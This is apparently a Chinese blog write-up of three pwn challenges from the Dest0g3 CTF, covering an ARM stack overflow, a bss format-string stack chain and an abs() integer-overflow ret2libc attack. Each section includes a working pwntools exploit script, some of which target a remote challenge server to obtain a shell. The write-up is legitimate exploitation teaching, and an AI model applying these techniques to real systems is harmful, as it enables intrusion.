---
title: Dest0g3 520迎新赛--栈题write_up
tags:
  - ARM架构
  - 格式化字符串漏洞
  - 整数溢出
categories: 赛题WP
abbrlink: 4354d4bf
---

## ez_aarch

### 总结：

考察的是最简单的arm架构的栈溢出。

### 保护策略

<img src="https://s2.loli.net/2022/05/27/wCtDTAO95cxIy61.png" alt="image-20220524111202855" style="zoom:33%;" />

关于arm架构是怎么启动程序和调试的，可以参考一下我的这篇[博客](https://www.cnblogs.com/ZIKH26/articles/16077191.html)

<img src="https://s2.loli.net/2022/05/27/hEBHxi1TcwblWUr.png" alt="image-20220524113235409" style="zoom:50%;" />

这里存在溢出，同时题目给了后面，并且很巧合的没开canary，因此这就是最简单的栈溢出题目，不过考虑到这是arm架构的题目跟x86的函数调用还不太一样，没法一眼就看出它的返回地址，需要调试一下。

![image-20220524124829771](https://s2.loli.net/2022/05/27/oMrNmXEPvBVdSeh.png)

先用cyclic生成48个字符，然后下个断点到0x40000009c8，c过去看一下崩溃的信息。

![image-20220524125046601](https://s2.loli.net/2022/05/27/liJ8YSZTKU7Ep4B.png)

发现是在kaaalaaa这里崩溃了（因为此时的x30寄存器就是这个值），所以我们只需要把这个地方的内容换成后门函数的地址即可。由于开了PIE，我们无法写入后面函数整个的地址，不过可以只写后门函数的最后一字节，写个0x3c即可。

![image-20220524125339086](https://s2.loli.net/2022/05/27/oUrikO5lxtX34eD.png)

### EXP：

```python
from pwn import *
context.log_level='debug'
#p=process('./stack')
p=remote('node4.buuoj.cn',28710)
e=ELF('./stack')
payload=40*b'a'+b'<'
p.send(payload)
p.interactive()
```

<img src="https://s2.loli.net/2022/05/27/Nd52ZPUytiEfYrb.png" alt="image-20220524125717811" style="zoom:33%;" />



## dest_love

总结：

1、考察的bss段上的格式化字符串漏洞，这道题属于最简单的布置栈链

2、以后做题之前尽量把libc版本找正确了，这道题的libc试了半天最后试出来了，结果做出来之后发现公告上写了是ubuntu21.04，不然还能做的更快。

### 保护策略：

<img src="https://s2.loli.net/2022/05/27/VxYJs8WM9wqFRQN.png" alt="image-20220524130642814" style="zoom:33%;" />

### 程序分析：

<img src="https://s2.loli.net/2022/05/27/J4TjCPa8QM5fgOS.png" alt="image-20220524130844091" style="zoom: 33%;" />

考察的格式化字符串漏洞，同时存在后门函数。

目前掌握的信息是，格式化字符串漏洞只能用6次，同时format是输入到了bss段，开了PIE。

### 大致思路：

因为这道题是bss段的格式化字符串，因此需要布置栈链来做，关于栈链的布置可以参考我的这篇[博客](https://www.cnblogs.com/ZIKH26/articles/16167705.html)

不过在这之前这道题有一个很恶心的地方，就是需要猜一下libc（其实也不用猜，公告里给了ubuntu21.04的版本）不过我当时做题的时候没有看公告，然后就一个一个试了一下，试的方法就是nc连接到服务器那边的程序，然后输入很多个%p，看一下泄露数据能否和本地的数据类型对应（比如远程栈顶偏移8的位置是个libc中地址，当本地的栈顶偏移8的位置也是个libc地址就算是对应）

最后试出来是2.33的libc。在ubuntu21.04的docker里跑一下。（如果初步学习怎么使用docker的可以看这篇[文章](https://www.cnblogs.com/ZIKH26/articles/16278170.html))

### 调试过程：

在布置栈链之前，先去泄露一下我们需要的地址，**对抗PIE需要用程序基地址，布置栈链需要用栈地址**，调试一下，看看栈里的数据。

下面是执行printf时的栈中情况。

![image-20220524190605046](https://s2.loli.net/2022/05/27/VUkdBPYgJuftAzZ.png)

由此可以获取所需地址的偏移，分别是4和8（不过需要加上6个寄存器），泄露出来之后，减去对应的偏移，即可获取程序基地址和所需栈地址。

接下来就是布置栈链。

先在栈中找一个栈地址（这个栈地址需要再指向一个栈地址），**很明显符合这个条件的是栈顶偏移4的位置**，由于我们的目的是在这个地方写入这个值（见下图）

![image-20220524191227999](https://s2.loli.net/2022/05/27/zUnZm6B8Q1fDTrp.png)

所以需要把这个dword_4010写到栈里。考虑到程序基地址和偏移8的栈中内容的前四字节一样，因此利用一下偏移8的数据，先将偏移4的内容指向的值去修改为偏移8的栈地址。

<img src="https://s2.loli.net/2022/05/27/32oN5BtSmJwz6qD.png" alt="image-20220524194519354" style="zoom:33%;" />

<img src="https://s2.loli.net/2022/05/27/gQbT3v5t4nJlsLI.png" alt="image-20220524194437287" style="zoom:33%;" />

此时再通过0x7ffcc75c1504这个地址来修改其指向的值，只需要更改低两字节即可。

		此时可以看见，我们已经把我们要修改内容的地址给写到栈里了。

接下来，在距离栈顶偏移8这个位置直接写入要修改的数据即可。

这个属于最简单的布置栈链了，如果熟悉整体流程的话，应该做起来还是比较轻松的。

### EXP:

直接复制粘贴这个exp，是打不通的，因为我写了几个函数，放到了tools这个库里面，如果想用下面这个脚本获取shell的话，需要复制粘贴[这里的源码](https://www.cnblogs.com/ZIKH26/articles/16307343.html)新建一个名为tools的py文件。或者把from tools import *以及debug和log函数这些出现的地方给注释掉也行。

```python
#!/usr/bin/env python3
#coding:utf-8
from pwn import *
import os
from tools import *
p=process('./b')
e=ELF('./b')
debug(p,'pie',0x1210)

p.sendlineafter(b'What about your love to Dest0g3?',b'a')
p.sendlineafter(b'What about your love to Dest0g3?',b'a')
sleep(0.2)
p.sendlineafter(b'What about your love to Dest0g3?','%14$p%10$p')
p.recvuntil('\x78')
base_addr=int(p.recv(12),16)-0x1270

p.recvuntil('\x78')
stack_leak=int(p.recv(12),16)
stack_hook=(stack_leak&0xffff)-0xc8

log('base_addr',hex(base_addr))
log('stack_leak',hex(stack_leak))
dest_addr=base_addr+0x4010
log('dest_addr',hex(dest_addr))

log('stack_hook',hex(stack_hook))

payload='%'+str(stack_hook)+'c%10$hn'
p.sendlineafter(b'What about your love to Dest0g3?',payload)
back_door=(base_addr+0x4010)&0xffff
payload='%'+str(back_door)+'c%39$hn'
p.sendlineafter(b'What about your love to Dest0g3?',payload)

payload='%1314520c%14$n'
p.sendlineafter(b'What about your love to Dest0g3?',payload)
p.interactive()

```

<img src="https://s2.loli.net/2022/05/27/2B3Osle1RNzFM5o.png" alt="image-20220524195121599" style="zoom:33%;" />

## ez_pwn

### 总结：

1、通过这道题对原码和补码有了更深的认识，负数的值=对应补码-(1<<32) （32位程序）

2、abs函数是有漏洞的，int类型的范围是-2147483648~ 2147483647 ，这就意味着abs将-2147483648转化为对应的正数是找不到对应的值，就会出现问题。

### 保护策略：
<img src="https://s2.loli.net/2022/05/27/qUpHdgolmKDJTke.png" alt="image-20220524224426473" style="zoom:50%;" />

### 程序分析：

<img src="https://s2.loli.net/2022/05/27/NA3umiPhdfqplJF.png" alt="image-20220524225032285" style="zoom:33%;" />

我最开始分析题目的时候，确实没找到漏洞，因为没开canary，我总感觉这道题是能溢出的，然后又一点一点的仔细分析，发现还是没啥毛病，但是根据经验来看，一般感觉没漏洞的时候，漏洞就出现在不太了解的新东西上面。这道题的漏洞点在这个abs函数上，下面来仔细分析一下abs函数漏洞产生的原理。
### abs函数漏洞分析

abs函数源码

```c
#include <stdlib.h>
#undef        abs
/* Return the absolute value of I.  */
int abs (int i)
{
  return i < 0 ? -i : i;
}
```

abs函数的作用就是取绝对值，也就是将负数转换为正数。但是int类型的范围是多少？-2147483648~ 2147483647 这就是int的范围，**可是这个范围不对称，这就意味着使用abs函数，输入-2147483648 它就找不到对应的正值**。当abs函数执行时就会将-2147483648的负号去掉，不过去掉负号之后是2147483648，而int类型的范围里压根就没有这个数字。如果实践一下就会发现-2147483648的绝对值还是-2147483648。

### 大致思路：

因此思路就出来了，输入-2147483648 ，经过abs()函数后，返回的依旧是-2147483648 ，可以绕过`if ( (int)abs32(v2) > 10 )`和`if ( v4 >= v2 )`两个检查（为啥能绕过第二个检查？因为v4和v2都是无符号整数，v2存储的值就是0x80000000，所以v4是肯定比v2小，继而绕过检查），从而可以不断的触发`__isoc99_scanf("%d", &v1[v4++]);`这行代码，v4的索引没有限制因此这里就是溢出点，让v4足够大，正好指向栈里v4的值，然后去修改v4的值，让其指向返回地址。接着就可以篡改返回地址了，剩下的就是ret2libc，劫持程序执行流再来一遍，最终获取shell。

其实这道题调试一下还是比较简单的，我就放几张图片说明一下过程吧。

下图是正在溢出
<img src="https://s2.loli.net/2022/05/27/rbFmHDZNL4It7Q5.png" alt="image-20220525224818058" style="zoom:50%;" />

![image-20220525224936710](https://s2.loli.net/2022/05/27/jPh2AinCrUdqYkH.png)

![image-20220525225022664](https://s2.loli.net/2022/05/27/CR3lwfp8qysodVN.png)

此时的v4这个偏移就让&v1[v4++]指向了返回地址，然后修改返回地址（如下图）

![image-20220525225403369](https://s2.loli.net/2022/05/27/XzZSq78doOAmspi.png)

接着把返回地址和参数写入，ret2libc即可。

### libc中地址无法直接写入内存中

后面的过程就不再演示了，最后唯一的一个坑就是写入system地址和/bin/sh地址时，由于32位程序libc中的地址是0xf7开头，但是这个数据太大了，不能直接用scanf(%d,&a)写入进去。

剖析一下原理：

> 由于scanf会对输入的内容进行过滤，只要是正数，那么存到内存里的最大就是0x7fffffff（因为符号位是不能表示大小的），假如现在想存入0xf7123456，我们来倒推一下（先不管它是咋输入进去的，假设它直接存在于内存中），内存中存放的0xf7123456对应二进制就是1111 0111 0001 0010 0011 0100 0101 0110。
>
> 我们来求一下他真正的值，发现符号位是1，因此判断其为负数，然后要减一，接着对整体取反，最后表示为0000 1000 1110 1101 1100 1011 1010 1010 对应16进制为0x8EDCBAA 因为它当成的补码符号位为1，因此它真正的值是-0x8EDCBAA。
>
> 而最终放到返回地址里的值，我们可不管输入的时候是个什么玩意，反正结果是要让他存储时为0xf7123456，因此我们选择输入-0x8EDCBAA即可
>
> 一句话总结就是：输入的负数存储到内存里时，它的补码是可以超过0x7fffffff的限制，从而可以实现写入0xf7这种更大的值。

观察一下0xf7123456和-0x8EDCBAA之间有什么规律没有，很明显如果用0x100000000减去0xf7123456，得到的就是0x8EDCBAA，换个位置让0xf7123456减去0x100000000，自然得到的就是-0x8EDCBAA。

负值=对应补码-0x100000000(32位程序) 这个式子在magic gadget中算偏移为负的时候也出现过。

### EXP:

PS:直接复制粘贴我这个脚本是打不通的，因为里面出现了我自己定义的函数，如果想使用下面的脚本，需要复制粘贴[这里的源码](https://www.cnblogs.com/ZIKH26/articles/16307343.html)新建一个名为tools的py文件。或者把出现的我自定义的函数注释掉，换回正常的代码。

```python
#!/usr/bin/env python3
#coding:utf-8
from pwn import *
from LibcSearcher import *
import os
from tools import *
#p=process('./ez_pwn')
p=remote('node4.buuoj.cn',27271)
e=ELF('./b')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#debug(p,0x0804930D)
p.sendline('-2147483800')
a=4369
for i in range(12):
    sleep(0.2)
    p.sendline('1')
    sleep(0.1)
    p.sendline(str(a+i))

sleep(0.2)
p.sendline('1')
sleep(0.1)
p.sendline(str(17))
puts_plt_addr=e.plt['puts']
puts_got_addr=e.got['puts']
main_addr=0x08049408
log('puts_plt_addr',(puts_plt_addr))
sleep(0.2)
p.sendline('1')
sleep(0.1)
p.sendline(str(puts_plt_addr))

sleep(0.1)
p.sendline('1')
sleep(0.1)
p.sendline(str(main_addr))

sleep(0.2)
p.sendline('1')
sleep(0.1)
p.sendline(str(puts_got_addr))

sleep(0.2)
p.sendline('5')
puts_addr=u32(p.recvuntil('\xf7')[-4:])
log('puts_addr',hex(puts_addr))
#result=local_search('puts',puts_addr,libc)
result =long_search('puts', puts_addr)
sys_addr=result[0]
bin_sh_addr=result[1]
p.sendline('-2147483800')
a=4369
for i in range(12):
    sleep(0.2)
    p.sendline('1')
    sleep(0.1)
    p.sendline(str(a+i))
sleep(0.2)
p.sendline('1')
sleep(0.1)
p.sendline(str(17))
puts_plt_addr=e.plt['puts']
puts_got_addr=e.got['puts']
main_addr=0x08049408
log('puts_plt_addr',(puts_plt_addr))
sleep(0.2)
p.sendline('1')
sleep(0.1)
p.sendline(str(sys_addr-(1<<32)))

sleep(0.1)
p.sendline('1')
sleep(0.1)
p.sendline(str(main_addr))

sleep(0.2)
p.sendline('1')
sleep(0.1)
p.sendline(str(bin_sh_addr-(1<<32)))

sleep(0.2)
p.sendline('5')
p.interactive()
```
<img src="https://s2.loli.net/2022/05/27/91AutEp7wzOoacL.png" alt="image-20220526001630304" style="zoom:33%;" />